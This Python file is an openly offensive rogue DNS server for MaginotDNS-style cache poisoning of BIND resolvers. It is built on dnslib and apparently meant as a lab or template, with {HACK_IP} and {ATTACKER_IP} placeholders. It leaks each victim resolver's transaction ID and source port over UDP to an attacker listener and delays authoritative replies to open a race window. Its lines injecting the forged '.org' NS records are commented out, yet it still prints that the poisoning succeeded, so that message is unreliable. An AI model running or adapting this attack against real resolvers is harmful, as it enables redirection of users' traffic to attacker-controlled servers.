import time
import random
import string
import socket
from dnslib import DNSHeader, RR, A, NS, QTYPE, DNSLabel
from dnslib.server import DNSServer, DNSLogger

# --- Configuration ---
# BIND will query this domain, this is our attack entry point
ATTACKER_DOMAIN = "example.com"
# The target domain we want to hijack
TARGET_DOMAIN_TO_HIJACK = "org" 
# Our forged, malicious NS server domain name
FAKE_NS_DOMAIN = "fakefake.com"
# The IP address of our forged NS server
FAKE_NS_IP = "{HACK_IP}" 

# Listening IP and port
MY_IP = "0.0.0.0"
PORT = 53
# Delay time (seconds), to ensure a time window
DELAY_SECONDS = 1

# Side-channel configuration: leak TxID and Port to the attack script
ATTACKER_LISTENER_IP = "{ATTACKER_IP}"  # Attacker listener IP
ATTACKER_LISTENER_PORT = 12345           # Attacker listener port

class PoisonResolver:
    """
    A malicious DNS resolver for executing MaginotDNS cache poisoning.
    """
    def generate_random_ip(self):
        """Generate a random private IP address for the response"""
        # return "10.{}.{}.{}".format(
        #     random.randint(0, 255),
        #     random.randint(0, 255),
        #     random.randint(0, 255)
        # )
        return "10.10.10.123"

    def resolve(self, request, handler):
        """
        Core logic for handling DNS requests.
        """
        qname = request.q.qname
        qtype = request.q.qtype
        
        print(f"[+] Received query for: {qname} (Type: {QTYPE[qtype]}) from {handler.client_address[0]}")

        # We only care about A record queries under the domain we control
        if qname.matchSuffix(DNSLabel(ATTACKER_DOMAIN)) and qtype == QTYPE.A:
            print(f"[*] Attack query received! Preparing poison response for hijacking '.{TARGET_DOMAIN_TO_HIJACK}'...")
            
            # === Side-channel information leakage ===
            # Extract the victim resolver's Transaction ID and source port
            victim_resolver_ip, victim_resolver_port = handler.client_address
            transaction_id = request.header.id
            
            print(f"[LEAK] Captured TxID={transaction_id}, Port={victim_resolver_port} from {victim_resolver_ip}")
            
            # Send via UDP to the attacker's listener port (side channel)
            try:
                side_channel_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Format expected by attack.py: "sport=xxxx,txid=yyyy"
                payload = f"sport={victim_resolver_port},txid={transaction_id}".encode('utf-8')
                side_channel_socket.sendto(payload, (ATTACKER_LISTENER_IP, ATTACKER_LISTENER_PORT))
                side_channel_socket.close()
                print(f"[LEAK] Sent side-channel data to {ATTACKER_LISTENER_IP}:{ATTACKER_LISTENER_PORT}")
            except Exception as e:
                print(f"[ERROR] Failed to send side-channel data: {e}")
            
            # Delay sending the response, creating a race window for the attacker
            print(f"[*] Delaying response for {DELAY_SECONDS} second(s)...")
            time.sleep(DELAY_SECONDS)

            # Create a reply packet
            reply = request.reply()
            reply.header.aa = True
            
            # 1. [Answer Section]
            # Provide a legitimate response to the original query, making it look normal.
            # This is to make BIND accept this packet.
            random_ip = self.generate_random_ip()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(random_ip), ttl=3600))
            # reply.add_auth(RR(TARGET_DOMAIN_TO_HIJACK, QTYPE.NS, rdata=NS(DNSLabel(FAKE_NS_DOMAIN)), ttl=3600))
            # reply.add_ar(RR(DNSLabel(FAKE_NS_DOMAIN), QTYPE.A, rdata=A(FAKE_NS_IP), ttl=3600))
            # =================================================================

            print(f"[!] Poison response sent! '.{TARGET_DOMAIN_TO_HIJACK}' is now pointing to {FAKE_NS_DOMAIN} ({FAKE_NS_IP}).")
            
            # Return the reply containing the malicious payload
            return reply

        # For other queries, return empty response
        print(f"[-] Query for {qname} does not match attack rules. Replying empty.")
        return request.reply()

# --- Main program entry point ---
if __name__ == '__main__':
    logger = DNSLogger(prefix=False)
    resolver = PoisonResolver()
    server = DNSServer(resolver, port=PORT, address=MY_IP, logger=logger)

    print(f"[*] Starting POISONOUS DNS Server")
    print(f"[*] Listening on {MY_IP}:{PORT}")
    print(f"[*] Any A query for *.{ATTACKER_DOMAIN} will trigger an attempt to hijack '.{TARGET_DOMAIN_TO_HIJACK}'")
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.stop()